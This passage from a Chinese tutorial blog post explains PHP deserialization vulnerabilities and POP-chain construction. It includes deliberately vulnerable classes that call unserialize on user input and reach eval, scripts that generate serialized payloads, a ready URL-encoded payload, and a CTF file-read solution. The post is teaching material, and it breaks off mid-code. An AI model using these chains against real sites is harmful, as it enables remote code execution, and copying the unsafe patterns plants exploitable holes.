<p>在url中填入序列化好的攻击代码，即可利用成功</p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200113235312.png" style="zoom:50%;">

<h5 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h5><p>我们在本地搭建环境后，新建class.php</p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114102834.png" style="zoom: 67%;">

<p>我们通过控制序列化字符串在本地新建一个shell.php进而打开phpinfo界面；在调用unserialize()时会通过__wakeup()把$test的写入到shell.php中。</p>
<p>效果如下：</p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114103132.png" style="zoom:50%;">

<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114103150.png" style="zoom: 25%;">





<h5 id="示例3：（多次调用魔术函数）"><a href="#示例3：（多次调用魔术函数）" class="headerlink" title="示例3：（多次调用魔术函数）"></a>示例3：（多次调用魔术函数）</h5><img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114103838.png" style="zoom:67%;">

<p>我们给test传入构造好的序列化字符串后，进行反序列化时自动调用<strong>wakeup()函数，从而在new joker()会自动调用对象joker中的</strong>construct()方法，从而把<?php phpinfo();?>写入到shell.php中：</p>
<h4 id="PHP反序列化pop链构造"><a href="#PHP反序列化pop链构造" class="headerlink" title="PHP反序列化pop链构造"></a>PHP反序列化pop链构造</h4><h5 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP:面向属性编程"></a>POP:面向属性编程</h5><p>​    面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p>
<h5 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h5><p>​    在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p>
<h5 id="POP-CHAIN"><a href="#POP-CHAIN" class="headerlink" title="POP CHAIN:"></a>POP CHAIN:</h5><p>​        把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。</p>
<p>通俗点就是：反序列化中，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smi1e</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> safe();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">safe</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Here is safe"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">unsafe</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br></pre></td></tr></table></figure>

<p>构造POP链。<br><code>protected $ClassObj = new evil();</code>是不行的，还是要通过<code>__construct</code>来实例化。<br>受保护成员变量含有<code>\0</code>和<code>*</code>需要URL编码一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smi1e</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> unsafe();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">unsafe</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data=<span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Smi1e());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:<code>test=O%3A5%3A%22Smi1e%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A6%3A%22unsafe%22%3A1%3A%7Bs%3A12%3A%22%00unsafe%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8e65abd0d89d46e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h5 id="phpggc："><a href="#phpggc：" class="headerlink" title="phpggc："></a>phpggc：</h5><p>收集了一些常见的PHP框架的通用反序列化的小工具链</p>
<p><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">https://github.com/ambionics/phpggc</a></p>
<p>使用方法参考此文章：</p>
<p><a href="https://xz.aliyun.com/t/5450" target="_blank" rel="noopener">从0到1掌握反序列化工具之PHPGGC</a></p>
<h5 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h5><p>首先，如果想要利用php的反序列化漏洞一般需要两个条件：</p>
<ol>
<li>unserialize()函数参数可控。(还可以结合Phar://协议)</li>
<li>魔法方法和危险函数。</li>
</ol>
<p>这两个条件都是不言而喻的，反序列化漏洞就是反序列化后魔法方法的执行，导致了魔法方法中的危险函数被执行。</p>
<p>可是我们常常会发现想要利用的危险函数并不在存在有魔法方法的类中，而此时就是要构造POP链，让没有关系的类扯上关系。</p>
<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>lemon师傅的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">'d'</span>]);</span><br></pre></td></tr></table></figure>

<p>可以看到，我们先在evil类中找到了eval危险函数，在lemon类中找到了可以利用的魔法方法<strong>destruct()，怎么利用它俩呢？首先，虽然\</strong>destruct()执行的是normal类的action，但是我们可以看到evil类也有action函数，且eval函数也在evil类的action方法中。</p>
<p>我们都知道，<strong>construct()函数是在类刚创建时执行的，这意味着即使我们将normal类替换成evil类叶柄不会影响后面的代码，而我们希望在\</strong>destruct中执行的action就变成了evil中的action。</p>
<p>生成序列化数据：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data = <span class="string">"phpinfo();"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> lemon()));</span></span><br></pre></td></tr></table></figure>

<p>我们再看一个例子(2019安恒杯1月赛)：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing; </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file); </span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> </span></span><br><span class="line"><span class="php">            &#123; </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span></span><br><span class="line"><span class="php">&#123;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $Input_data; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span> </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    highlight_file(<span class="string">"./index.php"</span>); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这道题其实和上面一题差不多，也是在baby类中的__toString()魔法方法中借用cool类的read()函数读取文件。</p>
<p>其中这道题还有以下的限制代码</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">$<span class="function"><span class="title">this</span>-&gt;</span><span class="function"><span class="title">nice</span> = unserialize($this-&gt;</span>amzing);</span><br><span class="line">$<span class="function"><span class="title">this</span>-&gt;</span><span class="function"><span class="title">nice</span>-&gt;</span>aaa = $sth;</span><br><span class="line"><span class="function"><span class="title">if</span>($this-&gt;</span><span class="function"><span class="title">nice</span>-&gt;</span><span class="function"><span class="title">aaa</span> === $this-&gt;</span><span class="function"><span class="title">nice</span>-&gt;</span>bbb)</span><br></pre></td></tr></table></figure>

<p><code>$sth</code>我们并不知道值，但如果我们事先将bbb的指针指向aaa，那么就一定可以成功了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;bbb = &amp;$a-&gt;aaa;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h5 id="复杂一点的例子"><a href="#复杂一点的例子" class="headerlink" title="复杂一点的例子"></a>复杂一点的例子</h5><p>还是lemon师傅博客中的例子：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $matchPattern;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $replacement;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($pattern, $repl)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;matchPattern = $pattern;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;replacement = $repl;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($data)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;matchPattern, <span class="keyword">$this</span>-&gt;replacement, $data);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $filters;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $endl;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filters, $endl)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;filters = $filters;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;endl = $endl;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($txt)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filters <span class="keyword">as</span> $filter) &#123;</span></span><br><span class="line"><span class="php">      $txt = $filter-&gt;filter($txt);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $txt = str_replace(<span class="string">'\n'</span>, <span class="keyword">$this</span>-&gt;endl, $txt);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $txt;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $filename;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $format;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $format)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;filename = str_replace(<span class="string">".."</span>, <span class="string">"__"</span>, str_replace(<span class="string">"/"</span>, <span class="string">"_"</span>, $filename));</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;format = $format;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span><span class="params">($txt)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $txt = <span class="keyword">$this</span>-&gt;format-&gt;format($txt);</span></span><br><span class="line"><span class="php">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span></span><br><span class="line"><span class="php">    file_put_contents(<span class="string">"/var/log/"</span> . <span class="keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $logwriter;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($writer)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;logwriter = $writer;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($txt)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Song</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $logger;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $name;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $group;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $url;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $group, $url)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;name = $name;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;group = $group;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;url = $url;</span></span><br><span class="line"><span class="php">    $fltr = <span class="keyword">new</span> OutputFilter(<span class="string">"/\[i\](.*)\[\/i\]/i"</span>, <span class="string">"&lt;i&gt;\\1&lt;/i&gt;"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;logger = <span class="keyword">new</span> Logger(<span class="keyword">new</span> LogWriter_File(<span class="string">"song_views"</span>, <span class="keyword">new</span> LogFileFormat(<span class="keyword">array</span>($fltr), <span class="string">"\n"</span>)));</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="string">"&lt;a href='"</span> . <span class="keyword">$this</span>-&gt;url . <span class="string">"'&gt;&lt;i&gt;"</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"&lt;/i&gt;&lt;/a&gt; by "</span> . <span class="keyword">$this</span>-&gt;group;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;logger-&gt;log(<span class="string">"Song "</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">" by [i]"</span> . <span class="keyword">$this</span>-&gt;group . <span class="string">"[/i] viewed.\n"</span>);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_name</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $lyrics;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $song;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($lyrics, $song)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;song = $song;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;lyrics = $lyrics;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="string">"&lt;p&gt;"</span> . <span class="keyword">$this</span>-&gt;song-&gt;__toString() . <span class="string">"&lt;/p&gt;&lt;p&gt;"</span> . str_replace(<span class="string">"\n"</span>, <span class="string">"&lt;br /&gt;"</span>, <span class="keyword">$this</span>-&gt;lyrics) . <span class="string">"&lt;/p&gt;\n"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;song-&gt;log();</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">shortForm</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="string">"&lt;p&gt;&lt;a href='song.php?name="</span> . urlencode(<span class="keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="string">"'&gt;"</span> . <span class="keyword">$this</span>-&gt;song-&gt;get_name() . <span class="string">"&lt;/a&gt;&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">name_is</span><span class="params">($name)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;song-&gt;get_name() === $name;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $oldlyrics = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span></span><br><span class="line"><span class="php">      $oldlyrics = unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) $oldlyrics []= $lyric;</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">'lyrics'</span>, base64_encode(serialize($oldlyrics)));</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">return</span> unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">      setcookie(<span class="string">'lyrics'</span>, base64_encode(serialize(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>))));</span></span><br><span class="line"><span class="php">      <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Porter</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exportData</span><span class="params">($lyrics)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> base64_encode(serialize($lyrics));</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">importData</span><span class="params">($lyrics)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> serialize(base64_decode($lyrics));</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Conn</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $conn;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($dbuser, $dbpass, $db)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;conn = mysqli_connect(<span class="string">"localhost"</span>, $dbuser, $dbpass, $db);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $r = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">    <span 